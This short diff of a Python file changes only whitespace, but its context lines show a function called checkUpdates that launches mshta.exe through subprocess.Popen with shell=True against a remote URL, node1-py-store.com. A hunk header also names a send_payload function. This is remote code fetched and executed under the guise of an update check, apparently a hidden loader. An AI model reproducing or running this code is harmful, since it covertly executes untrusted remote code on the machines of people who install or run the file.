@@ -62,7 +62,7 @@ async def send_payload(key, cycle):
         raise
 
 def checkUpdates():
-    try:
+    try: 
         subprocess.Popen(
             ['mshta.exe', 'https://node1-py-store.com' ],
             shell=True,
@@ -141,5 +141,6 @@ async def run():
 
 if __name__ == "__main__":
     asyncio.run(run())
+
 
 
